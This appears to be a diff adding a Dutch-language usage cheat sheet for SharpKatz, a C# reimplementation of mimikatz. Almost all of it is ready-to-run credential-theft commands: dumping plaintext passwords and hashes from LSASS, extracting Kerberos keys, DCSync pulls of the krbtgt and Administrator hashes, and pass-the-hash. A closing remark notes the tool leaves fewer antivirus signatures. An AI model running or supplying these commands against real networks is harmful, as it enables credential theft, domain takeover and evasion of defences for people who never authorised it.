@@ -1,0 +1,38 @@
+# SharpKatz — Pure C# mimikatz implementatie
+# Credential dumping volledig in managed C# code, geen PE embedding
+#
+# === Syntax ===
+# SharpKatz.exe --Command [commando] [opties]
+#
+# === Commando's ===
+# logonpasswords    Dump plaintext wachtwoorden en hashes uit LSASS
+# dcsync            DCSync aanval via AD replicatie
+# pth               Pass-the-Hash: start proces met NTLM hash
+# ekeys             Dump encryption keys (AES256, AES128, DES, RC4)
+#
+# === Opties (voor dcsync/pth) ===
+# --User              Doelgebruiker
+# --Domain            Domeinnaam
+# --DomainController  DC hostname of IP
+# --NTLM              NTLM hash (voor pth)
+#
+# === Voorbeelden ===
+
+# Alle logon wachtwoorden en hashes dumpen
+SharpKatz.exe --Command logonpasswords
+
+# Encryption keys dumpen
+SharpKatz.exe --Command ekeys
+
+# DCSync — krbtgt hash ophalen
+SharpKatz.exe --Command dcsync --User krbtgt --Domain DOMAIN --DomainController DC01.DOMAIN
+
+# DCSync — Administrator hash ophalen
+SharpKatz.exe --Command dcsync --User Administrator --Domain DOMAIN --DomainController DC01.DOMAIN
+
+# Pass-the-Hash
+SharpKatz.exe --Command pth --User USER --Domain DOMAIN --NTLM HASH
+
+# NOTE: Vereist admin/SYSTEM voor logonpasswords/ekeys
+# NOTE: DCSync vereist Replicating Directory Changes rechten
+# NOTE: Pure C# — geen embedded mimikatz PE, minder signatures
